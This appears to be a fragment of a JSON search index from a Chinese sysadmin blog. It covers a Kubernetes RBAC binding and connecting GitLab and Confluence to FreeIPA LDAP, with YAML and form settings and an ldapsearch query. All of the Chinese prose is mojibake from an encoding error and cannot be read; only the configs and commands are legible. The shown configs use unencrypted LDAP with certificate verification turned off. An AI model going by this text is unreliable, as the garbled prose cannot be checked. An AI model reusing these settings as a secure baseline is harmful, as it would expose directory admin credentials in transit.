class=\"cl\"\u003e  kind: Role\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  name: jenkins\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esubjects:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- kind: ServiceAccount\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  name: jenkins-admin\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  namespace: default\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eèµ„æºçš„é“¾æ¥ï¼šhttps://kubernetes.io/zh-cn/docs/reference/access-authn-authz/rbac/\u003c/p\u003e","title":"kubernetesä¸­ç”¨æˆ·rbacçš„å»ºç«‹"},{"content":"æ¥ä¸Šä¸€ç¯‡ï¼ŒFreeipaæ¥å®Œconfluenceï¼Œæ¥ä¸‹æ¥æ˜¯æ¥å…¥Gitlab.\nå…ˆä¸‹ç»“è®ºï¼šåŒæ ·é“ç†ï¼Œä¹Ÿæ˜¯å­˜åœ¨å…ˆæœ‰ Gitlab è´¦æˆ·ã€ç„¶åæ‰æœ‰çš„ FreeIPA LDAP ç›®å½•ï¼Œè¿™ä¹Ÿä¸è¦ç´§ï¼Œå› ä¸º Gitlab åŒæ ·æ”¯æŒ LDAP è®¤è¯æ–¹å¼çš„ç”¨æˆ·ä¸ç°æœ‰ç”¨æˆ·è¿›è¡Œåˆå¹¶ã€‚\nä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœæˆ‘å·²ç»åœ¨ Gitlab ä¸­åˆ›å»ºäº†ç”¨æˆ·åä¸º zhangranruiã€é‚®ç®±ä¸º zhangranrui@rendoumi.com çš„ç”¨æˆ·ï¼Œé‚£ä¹ˆæˆ‘åœ¨ LDAP ç›®å½•ä¸­åªéœ€è¦æŠŠ mail å­—æ®µä¹Ÿå†™æˆ zhangranrui@rendoumi.com å³å¯è¢« Gitlab è¯†åˆ«æˆåŒä¸€ç”¨æˆ·ã€‚æˆ–è€…è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ Gitlab ä¸­å¢åŠ  LDAP ç›®å½•ä¸­çš„ mail å­—æ®µçš„é‚®ç®±ï¼ˆGitlab æ”¯æŒåŒä¸€ç”¨æˆ·ç»‘å®šå¤šä¸ªé‚®ç®±ï¼‰ï¼Œè¿™æ ·åœ¨ Gitlab ä¸­ä½¿ç”¨ LDAP è®¤è¯çš„æ—¶å€™ä¹Ÿä¼šè¢«è§†ä¸ºåŒä¸€ç”¨æˆ·ã€‚è·Ÿ Confluence æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚\næ³¨æ„ï¼šè¿™æ ·æ”¹äº†ä¹‹åï¼Œæ— è®ºç™»å½•æˆ–æ˜¯æ‹‰å–ä»£ç ï¼Œå°±åªèƒ½ä½¿ç”¨LDAPçš„è´¦å·å¯†ç ï¼Œä¸èƒ½ä½¿ç”¨æ—§çš„ GitLab Standard çš„è´¦å·ã€‚\næˆ‘ä»¬çš„ Gitlab ç‰ˆæœ¬æ¯”ä»·è€11.1.0ï¼Œæ‰€ä»¥æ”¹çš„æ˜¯ gitlab.yml\nldap: enabled: true servers: main: # \u0026#39;main\u0026#39; is the GitLab \u0026#39;provider ID\u0026#39; of this LDAP server label: \u0026#39;LDAP\u0026#39; host: \u0026#39;freeipa.bybon.cn\u0026#39; port: 389 uid: \u0026#39;uid\u0026#39; encryption: \u0026#39;plain\u0026#39; # \u0026#34;start_tls\u0026#34; or \u0026#34;simple_tls\u0026#34; or \u0026#34;plain\u0026#34; verify_certificates: false ca_file: \u0026#39;\u0026#39; ssl_version: \u0026#39;\u0026#39; bind_dn: \u0026#39;uid=admin,cn=users,cn=accounts,dc=bybon,dc=cn\u0026#39; password: \u0026#39;xxxxxx\u0026#39; timeout: 10 active_directory: false allow_username_or_email_login: false block_auto_created_users: false base: \u0026#39;dc=bybon,dc=cn\u0026#39; user_filter: \u0026#39;(\u0026amp;(objectclass=inetorgperson)(memberOf=cn=gitlab-users,cn=groups,cn=accounts,dc=bybon,dc=cn))\u0026#39; attributes: username: [\u0026#39;uid\u0026#39;] email: [\u0026#39;mail\u0026#39;] name: \u0026#39;displayName\u0026#39; first_name: \u0026#39;givenName\u0026#39; last_name: \u0026#39;sn\u0026#39; lowercase_usernames: false æ–°ç‰ˆæœ¬çš„è¯ï¼ŒæŒ‰å­—æ®µæ¯”è¾ƒå³å¯ã€‚æ³¨æ„ä¸Šé¢ï¼Œæˆ‘æ˜¯æå‰å»ºç«‹äº†ä¸€ä¸ª gitlab-users çš„ç»„ï¼ŒæŠŠç”¨æˆ·å…ˆéƒ½æ”¾è¿›ç»„é‡Œï¼Œè¿™æ ·æ–¹ä¾¿ç®¡ç†ã€‚\n","permalink":"https://rendoumi.com/posts/20230217-freeipa_gitlab/","summary":"\u003cp\u003eæ¥ä¸Šä¸€ç¯‡ï¼ŒFreeipaæ¥å®Œconfluenceï¼Œæ¥ä¸‹æ¥æ˜¯æ¥å…¥Gitlab.\u003c/p\u003e\n\u003cp\u003eå…ˆä¸‹ç»“è®ºï¼šåŒæ ·é“ç†ï¼Œä¹Ÿæ˜¯å­˜åœ¨å…ˆæœ‰ Gitlab è´¦æˆ·ã€ç„¶åæ‰æœ‰çš„ FreeIPA LDAP ç›®å½•ï¼Œè¿™ä¹Ÿä¸è¦ç´§ï¼Œå› ä¸º Gitlab åŒæ ·æ”¯æŒ LDAP è®¤è¯æ–¹å¼çš„ç”¨æˆ·ä¸ç°æœ‰ç”¨æˆ·è¿›è¡Œåˆå¹¶ã€‚\u003c/p\u003e\n\u003cp\u003eä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœæˆ‘å·²ç»åœ¨ Gitlab ä¸­åˆ›å»ºäº†ç”¨æˆ·åä¸º zhangranruiã€é‚®ç®±ä¸º \u003ca href=\"mailto:zhangranrui@rendoumi.com\"\u003ezhangranrui@rendoumi.com\u003c/a\u003e çš„ç”¨æˆ·ï¼Œé‚£ä¹ˆæˆ‘åœ¨ LDAP ç›®å½•ä¸­åªéœ€è¦æŠŠ mail å­—æ®µä¹Ÿå†™æˆ \u003ca href=\"mailto:zhangranrui@rendoumi.com\"\u003ezhangranrui@rendoumi.com\u003c/a\u003e å³å¯è¢« Gitlab è¯†åˆ«æˆåŒä¸€ç”¨æˆ·ã€‚æˆ–è€…è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ Gitlab ä¸­å¢åŠ  LDAP ç›®å½•ä¸­çš„ mail å­—æ®µçš„é‚®ç®±ï¼ˆGitlab æ”¯æŒåŒä¸€ç”¨æˆ·ç»‘å®šå¤šä¸ªé‚®ç®±ï¼‰ï¼Œè¿™æ ·åœ¨ Gitlab ä¸­ä½¿ç”¨ LDAP è®¤è¯çš„æ—¶å€™ä¹Ÿä¼šè¢«è§†ä¸ºåŒä¸€ç”¨æˆ·ã€‚è·Ÿ Confluence æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚\u003c/p\u003e\n\u003cp\u003eæ³¨æ„ï¼šè¿™æ ·æ”¹äº†ä¹‹åï¼Œæ— è®ºç™»å½•æˆ–æ˜¯æ‹‰å–ä»£ç ï¼Œå°±åªèƒ½ä½¿ç”¨LDAPçš„è´¦å·å¯†ç ï¼Œä¸èƒ½ä½¿ç”¨æ—§çš„ GitLab Standard çš„è´¦å·ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬çš„ Gitlab ç‰ˆæœ¬æ¯”ä»·è€11.1.0ï¼Œæ‰€ä»¥æ”¹çš„æ˜¯ gitlab.yml\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ldap:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    enabled: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    servers:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      main: \u003cspan class=\"c1\"\u003e# \u0026#39;main\u0026#39; is the GitLab \u0026#39;provider ID\u0026#39; of this LDAP server\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        label: \u003cspan class=\"s1\"\u003e\u0026#39;LDAP\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        host: \u003cspan class=\"s1\"\u003e\u0026#39;freeipa.bybon.cn\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        port: \u003cspan class=\"m\"\u003e389\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        uid: \u003cspan class=\"s1\"\u003e\u0026#39;uid\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        encryption: \u003cspan class=\"s1\"\u003e\u0026#39;plain\u0026#39;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# \u0026#34;start_tls\u0026#34; or \u0026#34;simple_tls\u0026#34; or \u0026#34;plain\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        verify_certificates: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ca_file: \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ssl_version: \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        bind_dn: \u003cspan class=\"s1\"\u003e\u0026#39;uid=admin,cn=users,cn=accounts,dc=bybon,dc=cn\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        password: \u003cspan class=\"s1\"\u003e\u0026#39;xxxxxx\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        timeout: \u003cspan class=\"m\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        active_directory: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        allow_username_or_email_login: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        block_auto_created_users: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        base: \u003cspan class=\"s1\"\u003e\u0026#39;dc=bybon,dc=cn\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        user_filter: \u003cspan class=\"s1\"\u003e\u0026#39;(\u0026amp;(objectclass=inetorgperson)(memberOf=cn=gitlab-users,cn=groups,cn=accounts,dc=bybon,dc=cn))\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        attributes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          username: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;uid\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          email:    \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;mail\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          name:       \u003cspan class=\"s1\"\u003e\u0026#39;displayName\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          first_name: \u003cspan class=\"s1\"\u003e\u0026#39;givenName\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          last_name:  \u003cspan class=\"s1\"\u003e\u0026#39;sn\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          lowercase_usernames: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ–°ç‰ˆæœ¬çš„è¯ï¼ŒæŒ‰å­—æ®µæ¯”è¾ƒå³å¯ã€‚æ³¨æ„ä¸Šé¢ï¼Œæˆ‘æ˜¯æå‰å»ºç«‹äº†ä¸€ä¸ª gitlab-users çš„ç»„ï¼ŒæŠŠç”¨æˆ·å…ˆéƒ½æ”¾è¿›ç»„é‡Œï¼Œè¿™æ ·æ–¹ä¾¿ç®¡ç†ã€‚\u003c/p\u003e","title":"Gitlabé›†æˆè¿›freeIPAè¿›è¡Œç»Ÿä¸€è®¤è¯"},{"content":"å…¬å¸å†³å®šç”¨ç»Ÿä¸€ç”¨æˆ·ç®¡ç†ç³»ç»Ÿï¼Œé‚£å¿…ç„¶æ˜¯å¾®è½¯çš„ AD å’Œå¼€æºçš„ LDAP äºŒé€‰ä¸€äº†\nè‡ªç„¶ç”¨ Freeipa ä½œä¸ºé¦–é€‰ã€‚\nèŠ±æ—¶é—´ä»”ç»†è°ƒç ”äº†ä¸€ä¸‹ï¼Œå…ˆè¯´ç»“è®ºï¼š\nå¦‚æœ confluence å·²ç»æœ‰å¾ˆå¤šç”¨æˆ·ï¼Œé‚£ä¹ˆå¯¹ä¸èµ·ï¼Œè¿™äº›ç”¨æˆ·çš„å¯†ç éƒ½å¿…é¡»é€šçŸ¥åˆ°ä¸ªäººï¼Œå¼ºåˆ¶è¿›è¡Œä¿®æ”¹ï¼Œæ—§æœ‰çš„å¯†ç å®Œå…¨æ— æ³•å¯¼å‡ºï¼ˆé™¤éä¸€ä¸ªä¸€ä¸ªäººé—®å‡ºæ¥ï¼‰ã€‚\nconfluence å®é™…ä¸Šæ˜¯ç”¨äº†ä¸€ä¸ªå†…ç½®çš„ç›®å½•è½¯ä»¶æ¥ç®¡ç†ç”¨æˆ·çš„ï¼Œç”¨æˆ·å”¯ä¸€å­˜åœ¨çš„å‡­æ®å°±æ˜¯é‚®ç®±ã€‚\nconfluence æ”¯æŒåŒæ—¶ä»å¤šä¸ªç›®å½•æ ‘ä¸­æŒ‰ç…§é¡ºåºæ¥æŸ¥è¯¢ç”¨æˆ·ï¼ŒæŸ¥è¯¢åˆ°çš„ç»“æœä¼šåˆå¹¶ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œæ’ç¬¬ä¸€çš„ç›®å½•æ ‘æ˜¯freeipaï¼Œæ’ç¬¬äºŒä½çš„ç›®å½•æ ‘æ˜¯å†…ç½®ç›®å½•ï¼Œä¸¤ä¸ªç›®å½•æ ‘éƒ½æœ‰ä¸€ä¸ªç”¨æˆ·ï¼Œä¸¤æ¡è®°å½•çš„é‚®ä»¶æ˜¯ä¸€è‡´çš„ï¼Œé‚£ä¹ˆä¼šåœ¨æ’ç¬¬ä¸€çš„ freeipa æ ‘ä¸­è®¤è¯ç”¨æˆ·ï¼Œä½†ä¼šæŠŠä¸¤ä¸ªç›®å½•æ ‘ä¸­ç”¨æˆ·çš„ä¿¡æ¯æ‹¼æ¥åˆå¹¶èµ·æ¥æ€»ä½“è¿”å›ã€‚\nè¿™æ ·å°±æ˜ç™½äº†æŠŠï¼Œæˆ‘ä»¬åªç”¨ç¬¬ä¸€ä¸ª freeipa ç›®å½•æ ‘æ¥è®¤è¯ç”¨æˆ·ï¼ŒåŸæœ‰çš„ç»„æƒé™è¿˜æ˜¯ç”¨ç¬¬äºŒä¸ªå†…ç½®ç›®å½•æ ‘ä¸­çš„ä¿¡æ¯ï¼Œä¿æŒä¸¤æ£µæ ‘ä¸­ç”¨æˆ·çš„ mail ä¿æŒä¸€è‡´å³å¯ï¼Œæ­¥éª¤å¦‚ä¸‹ã€‚\næˆ‘ä»¬é¦–å…ˆè¦æå‰åœ¨freeIPAé‡Œé¢å»ºç«‹ä¸¤ä¸ªç»„ï¼š\nconfluence-administrators\nconfluence-users\nç„¶åè·‘åˆ° Confluence é‡Œï¼Œç”¨æˆ·ç›®å½•ï¼Œæ·»åŠ ä¸€ä¸ª freeipa çš„ç›®å½•æœåŠ¡æ”¾åœ¨å‰é¢\nè¯¦ç»†é…ç½®çš„å‚æ•°å¦‚ä¸‹ï¼š\né…ç½®å¦‚ä¸‹ï¼š Server Settings: - Namel: freeipa - Directory Type: OpenLDAP - Server: example.com - Port: 389 - Use SLL: false - Username: uid=admin,cn=users,cn=accounts,dc=bybon,dc=cn - Password: \u0026lt;insert password here\u0026gt; LDAP Schema: - Base DN: dc=bybon,dc=cn - Additional User DN: cn=users,cn=accounts - Additional Group DN:cn=groups,cn=accounts LDAP Permissions: Select Read/Write Advanced Settings: Default User Schema Settings - User Object Class: inetorgperson - User Object Filter: (\u0026amp;(objectclass=inetorgperson)(memberOf=cn=confluence-users,cn=groups,cn=accounts,dc=bybon,dc=cn)) - User Name Attribute: uid - User Name RDN Attribute: uid - User First Name Attribute: giveName - User Last Name Attribute: sn - User Display Name Attribute: displayName - User Email Attribute: mail - User Password Attribute: userPassword - User Password Encryption: SHA - User Unique ID Attribute: uid Group Schema Settings - Group Object Class: groupofnames # all lowercase - Group Object Filter: (objectclass=groupofnames) # all lowercase - Group Name Attribute: cn - Group Description Attribute: description Membership Schema Settings - Group Members Attribute: member #lowercase - User Membership Attribute:memberOf æ”¾å…¨ä¸­æ–‡çš„å›¾å¦‚ä¸‹ï¼š\næŠ˜ç£¨äº†å¾ˆä¹…æ‰å¼„å‡ºæ¥ï¼ŒéªŒè¯ä¸€ä¸‹ç”¨æˆ·ï¼š\nè·‘åˆ° confluence é‡Œé¢æŸ¥çœ‹ï¼Œæ˜æ˜¾æ˜¯ä¸¤ä¸ªç›®å½•æ ‘åˆå¹¶çš„ç»“æœï¼š\nå…³äº admin çš„é—®é¢˜ï¼Œæ³¨æ„ä¸€ä¸‹ï¼Œæˆ‘ä»¬ä¸Šé¢æ‰¾ç”¨æˆ·çš„ filter æ˜¯æ‰¾ä¸åˆ° admin ç”¨æˆ·çš„ã€‚ä½†æ˜¯ç¬¬ä¸€æ­¥è®¤è¯æ˜¯ ldap åšçš„ï¼Œè®¤è¯è¿‡äº†ä»¥åï¼Œfreeipa çš„ ldap filter è¿‡æ»¤åæ‰¾ä¸åˆ° admin è¿™ä¸ªç”¨æˆ·ï¼Œæ‰€ä»¥åªä¼šåœ¨å†…ç½®ç›®å½•æœ‰ admin çš„ä¿¡æ¯ï¼Œä¸‹é¢éªŒè¯ä¸€ä¸‹ï¼Œadmin åªå­˜åœ¨äº Confluence Internal Directory ä¸­ã€‚\nå†è¡¥å……ä¸€ç‚¹ï¼Œfreeipa æ˜¯å¯ä»¥åŒ¿åè®¿é—®çš„ï¼Œä½†æ˜¯åŒ¿åçŠ¶æ€ä¸‹ï¼Œä¸€äº›å±æ€§å­—æ®µæ˜¯çœ‹ä¸è§çš„ï¼Œæ¯”å¦‚ mail ã€‚\næ‰€ä»¥æƒ³è¦æŸ¥åˆ°å…¨éƒ¨å­—æ®µï¼Œå¿…é¡»ç™»å½•ï¼Œæ”¾ä¸€ä¸ªæŸ¥è¯¢çš„è„šæœ¬ï¼š\nldapsearch -W -D uid=admin,cn=users,cn=accounts,dc=bybon,dc=cn -h localhost -b cn=users,cn=accounts,dc=bybon,dc=cn \u0026#39;(\u0026amp;(objectclass=inetorgperson)(memberOf=cn=confluence-users,cn=groups,cn=accounts,dc=bybon,dc=cn))\u0026#39; ","permalink":"https://rendoumi.com/posts/20230216-freeipa_confluence/","summary":"\u003cp\u003eå…¬å¸å†³å®šç”¨ç»Ÿä¸€ç”¨æˆ·ç®¡ç†ç³»ç»Ÿï¼Œé‚£å¿…ç„¶æ˜¯å¾®è½¯çš„ AD å’Œå¼€æºçš„ LDAP äºŒé€‰ä¸€äº†\u003c/p\u003e\n\u003cp\u003eè‡ªç„¶ç”¨ Freeipa ä½œä¸ºé¦–é€‰ã€‚\u003c/p\u003e\n\u003cp\u003eèŠ±æ—¶é—´ä»”ç»†è°ƒç ”äº†ä¸€ä¸‹ï¼Œå…ˆè¯´ç»“è®ºï¼š\u003c/p\u003e\n\u003cp\u003eå¦‚æœ confluence å·²ç»æœ‰å¾ˆå¤šç”¨æˆ·ï¼Œé‚£ä¹ˆå¯¹ä¸èµ·ï¼Œè¿™äº›ç”¨æˆ·çš„å¯†ç éƒ½å¿…é¡»é€šçŸ¥åˆ°ä¸ªäººï¼Œå¼ºåˆ¶è¿›è¡Œä¿®æ”¹ï¼Œæ—§æœ‰çš„å¯†ç å®Œå…¨æ— æ³•å¯¼å‡ºï¼ˆé™¤éä¸€ä¸ªä¸€ä¸ªäººé—®å‡ºæ¥ï¼‰ã€‚\u003c/p\u003e\n\u003cp\u003econfluence å®é™…ä¸Šæ˜¯ç”¨äº†ä¸€ä¸ªå†…ç½®çš„ç›®å½•è½¯ä»¶æ¥ç®¡ç†ç”¨æˆ·çš„ï¼Œç”¨æˆ·å”¯ä¸€å­˜åœ¨çš„å‡­æ®å°±æ˜¯é‚®ç®±ã€‚\u003c/p\u003e\n\u003cp\u003econfluence æ”¯æŒåŒæ—¶ä»å¤šä¸ªç›®å½•æ ‘ä¸­æŒ‰ç…§é¡ºåºæ¥æŸ¥è¯¢ç”¨æˆ·ï¼ŒæŸ¥è¯¢åˆ°çš„ç»“æœä¼šåˆå¹¶ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œæ’ç¬¬ä¸€çš„ç›®å½•æ ‘æ˜¯freeipaï¼Œæ’ç¬¬äºŒä½çš„ç›®å½•æ ‘æ˜¯å†…ç½®ç›®å½•ï¼Œä¸¤ä¸ªç›®å½•æ ‘éƒ½æœ‰ä¸€ä¸ªç”¨æˆ·ï¼Œä¸¤æ¡è®°å½•çš„é‚®ä»¶æ˜¯ä¸€è‡´çš„ï¼Œé‚£ä¹ˆä¼šåœ¨æ’ç¬¬ä¸€çš„ freeipa æ ‘ä¸­è®¤è¯ç”¨æˆ·ï¼Œä½†ä¼šæŠŠä¸¤ä¸ªç›®å½•æ ‘ä¸­ç”¨æˆ·çš„ä¿¡æ¯æ‹¼æ¥åˆå¹¶èµ·æ¥æ€»ä½“è¿”å›ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™æ ·å°±æ˜ç™½äº†æŠŠï¼Œæˆ‘ä»¬åªç”¨ç¬¬ä¸€ä¸ª freeipa ç›®å½•æ ‘æ¥è®¤è¯ç”¨æˆ·ï¼ŒåŸæœ‰çš„ç»„æƒé™è¿˜æ˜¯ç”¨ç¬¬äºŒä¸ªå†…ç½®ç›®å½•æ ‘ä¸­çš„ä¿¡æ¯ï¼Œä¿æŒä¸¤æ£µæ ‘ä¸­ç”¨æˆ·çš„ mail ä¿æŒä¸€è‡´å³å¯ï¼Œæ­¥éª¤å¦‚ä¸‹ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬é¦–å…ˆè¦æå‰åœ¨freeIPAé‡Œé¢å»ºç«‹ä¸¤ä¸ªç»„ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003econfluence-administrators\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003econfluence-users\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230216171408006\" loading=\"lazy\" src=\"/posts/20230216-freeipa_confluence/image-20230216171408006.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åè·‘åˆ° Confluence é‡Œï¼Œç”¨æˆ·ç›®å½•ï¼Œæ·»åŠ ä¸€ä¸ª freeipa çš„ç›®å½•æœåŠ¡æ”¾åœ¨å‰é¢\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230216171611828\" loading=\"lazy\" src=\"/posts/20230216-freeipa_confluence/image-20230216171611828.png\"\u003e\u003c/p\u003e\n\u003cp\u003eè¯¦ç»†é…ç½®çš„å‚æ•°å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eé…ç½®å¦‚ä¸‹ï¼š\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eServer Settings:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Namel: freeipa\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Directory Type: OpenLDAP\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Server: example.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Port: \u003cspan class=\"m\"\u003e389\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Use SLL: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Username: \u003cspan class=\"nv\"\u003euid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eadmin,cn\u003cspan class=\"o\"\u003e=\u003c/span\u003eusers,cn\u003cspan class=\"o\"\u003e=\u003c/span\u003eaccounts,dc\u003cspan class=\"o\"\u003e=\u003c/span\u003ebybon,dc\u003cspan class=\"o\"\u003e=\u003c/span\u003ecn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Password: \u0026lt;insert password here\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLDAP Schema:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Base DN: \u003cspan class=\"nv\"\u003edc\u003c/span\u003e\u003cspan 